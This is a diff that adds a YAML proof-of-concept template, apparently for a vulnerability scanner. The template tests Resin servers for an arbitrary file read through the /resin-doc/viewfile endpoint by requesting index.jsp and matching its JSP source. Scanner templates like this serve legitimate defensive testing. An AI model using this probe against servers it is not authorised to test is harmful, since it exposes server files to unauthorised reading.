@@ -1,0 +1,22 @@
+id: poc-yaml-resin-viewfile-fileread
+info:
+  name: Resin Viewfile Fileread
+  severity: high
+  tags:
+  - 文件读取
+  finger: Resin
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /resin-doc/viewfile/?file=index.jsp
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "%@ page session=\"false\" import=\"com.caucho.vfs.*,
+    com.caucho.server.webapp.*\" %")
+  output: []
